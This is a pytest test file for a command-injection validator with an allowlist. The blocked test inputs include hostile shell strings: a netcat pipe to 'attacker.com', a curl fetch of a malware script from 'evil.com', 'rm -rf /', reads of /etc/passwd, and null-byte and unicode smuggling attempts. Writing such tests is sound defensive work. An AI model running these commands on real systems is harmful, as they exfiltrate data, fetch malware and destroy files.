"""
Tests for Gate Security - Command Injection Prevention (FIX-001)

These tests verify that the gate system properly validates commands
before execution and blocks potentially dangerous commands.
"""

import pytest
from src.core.gate import validate_command, execute_safe_command, ALLOWED_COMMANDS


class TestCommandValidation:
    """Test command validation for security."""

    def test_allowed_command_executes_successfully(self):
        """Commands in the allowlist should be valid."""
        is_valid, error = validate_command("pytest tests/")
        assert is_valid is True
        assert error == ""

    def test_command_with_semicolon_blocked(self):
        """Semicolons can chain commands - must be blocked."""
        is_valid, error = validate_command("pytest; rm -rf /")
        assert is_valid is False
        assert "dangerous" in error.lower()

    def test_command_with_pipe_blocked(self):
        """Pipes can redirect output - must be blocked."""
        is_valid, error = validate_command("cat file | nc attacker.com 1234")
        assert is_valid is False
        assert "dangerous" in error.lower()

    def test_command_with_backtick_blocked(self):
        """Backticks allow command substitution - must be blocked."""
        is_valid, error = validate_command("echo `whoami`")
        assert is_valid is False
        assert "dangerous" in error.lower()

    def test_unknown_base_command_blocked(self):
        """Commands not in allowlist must be blocked."""
        is_valid, error = validate_command("curl http://evil.com/malware.sh")
        assert is_valid is False
        assert "allowlist" in error.lower()

    def test_empty_command_rejected(self):
        """Empty commands must be rejected."""
        is_valid, error = validate_command("")
        assert is_valid is False
        assert "empty" in error.lower()

    def test_whitespace_only_command_rejected(self):
        """Whitespace-only commands must be rejected."""
        is_valid, error = validate_command("   ")
        assert is_valid is False
        assert "empty" in error.lower()

    def test_absolute_path_command_validated(self):
        """Absolute paths should extract the base command for validation."""
        is_valid, error = validate_command("/usr/bin/pytest tests/")
        assert is_valid is True

    def test_subshell_blocked(self):
        """Subshell syntax must be blocked."""
        is_valid, error = validate_command("$(whoami)")
        assert is_valid is False
        assert "dangerous" in error.lower()

    def test_command_substitution_blocked(self):
        """Command substitution with $() must be blocked."""
        is_valid, error = validate_command("echo $(cat /etc/passwd)")
        assert is_valid is False
        assert "dangerous" in error.lower()

    def test_background_execution_blocked(self):
        """Background execution with & must be blocked."""
        is_valid, error = validate_command("pytest &")
        assert is_valid is False
        assert "dangerous" in error.lower()

    def test_redirect_output_blocked(self):
        """Output redirection must be blocked."""
        is_valid, error = validate_command("echo test > /tmp/file")
        assert is_valid is False
        assert "dangerous" in error.lower()

    def test_redirect_input_blocked(self):
        """Input redirection must be blocked."""
        is_valid, error = validate_command("cat < /etc/passwd")
        assert is_valid is False
        assert "dangerous" in error.lower()

    def test_brace_expansion_blocked(self):
        """Brace expansion must be blocked."""
        is_valid, error = validate_command("echo {a,b,c}")
        assert is_valid is False
        assert "dangerous" in error.lower()

    def test_escape_character_blocked(self):
        """Backslash escapes must be blocked."""
        is_valid, error = validate_command("echo test\\nmore")
        assert is_valid is False
        assert "dangerous" in error.lower()


class TestAllowedCommands:
    """Test all commands in the allowlist."""

    def test_pytest_allowed(self):
        """pytest should be allowed."""
        is_valid, _ = validate_command("pytest tests/unit/")
        assert is_valid is True

    def test_python_allowed(self):
        """python should be allowed."""
        is_valid, _ = validate_command("python -m pytest")
        assert is_valid is True

    def test_pip_allowed(self):
        """pip should be allowed."""
        is_valid, _ = validate_command("pip install -r requirements.txt")
        assert is_valid is True

    def test_git_allowed(self):
        """git should be allowed."""
        is_valid, _ = validate_command("git status")
        assert is_valid is True

    def test_ls_allowed(self):
        """ls should be allowed."""
        is_valid, _ = validate_command("ls -la")
        assert is_valid is True

    def test_cat_allowed(self):
        """cat should be allowed."""
        is_valid, _ = validate_command("cat README.md")
        assert is_valid is True

    def test_echo_allowed(self):
        """echo should be allowed."""
        is_valid, _ = validate_command("echo hello")
        assert is_valid is True

    def test_grep_allowed(self):
        """grep should be allowed."""
        is_valid, _ = validate_command("grep -r pattern src/")
        assert is_valid is True

    def test_find_allowed(self):
        """find should be allowed."""
        is_valid, _ = validate_command("find . -name '*.py'")
        assert is_valid is True

    def test_make_allowed(self):
        """make should be allowed."""
        is_valid, _ = validate_command("make test")
        assert is_valid is True

    def test_npm_allowed(self):
        """npm should be allowed."""
        is_valid, _ = validate_command("npm test")
        assert is_valid is True

    def test_node_allowed(self):
        """node should be allowed."""
        is_valid, _ = validate_command("node --version")
        assert is_valid is True


class TestExecuteSafeCommand:
    """Test the safe command execution function."""

    def test_blocked_command_returns_error(self):
        """Blocked commands should return error dict with blocked=True."""
        result = execute_safe_command("rm -rf /")
        assert result['success'] is False
        assert result.get('blocked') is True
        assert 'error' in result

    def test_valid_command_returns_result(self):
        """Valid commands should execute and return results."""
        result = execute_safe_command("echo hello")
        assert result['success'] is True
        assert 'hello' in result.get('stdout', '')
        assert result.get('blocked') is None or result.get('blocked') is False

    def test_command_with_arguments(self):
        """Commands with arguments should work."""
        result = execute_safe_command("python --version")
        assert result['success'] is True
        assert result.get('blocked') is None or result.get('blocked') is False

    def test_failed_command_returns_failure(self):
        """Commands that fail should return success=False."""
        result = execute_safe_command("python -c 'exit(1)'")
        assert result['success'] is False
        assert result.get('blocked') is None or result.get('blocked') is False

    def test_invalid_syntax_blocked(self):
        """Invalid command syntax should be blocked."""
        result = execute_safe_command("pytest 'unclosed quote")
        assert result['success'] is False


class TestSecurityEdgeCases:
    """Test edge cases and bypass attempts."""

    def test_null_byte_injection(self):
        """Null bytes should not bypass validation."""
        is_valid, _ = validate_command("pytest\x00; rm -rf /")
        # This depends on how shlex handles null bytes
        # The important thing is it shouldn't execute rm
        # Either it's invalid or the base command is still pytest

    def test_unicode_bypass_attempt(self):
        """Unicode characters shouldn't bypass validation."""
        # Some systems might interpret unicode semicolons
        is_valid, error = validate_command("pytest\u037e rm -rf /")
        # Should be valid if the unicode is treated as part of arguments
        # The key is rm shouldn't be executed

    def test_very_long_command(self):
        """Very long commands should still be validated."""
        long_arg = "a" * 10000
        is_valid, _ = validate_command(f"pytest {long_arg}")
        assert is_valid is True

    def test_newline_in_command(self):
        """Newlines in commands should be handled safely."""
        # shlex.split should handle embedded newlines
        is_valid, _ = validate_command("pytest\n-v")
        # The validation itself might pass, but execution would handle it
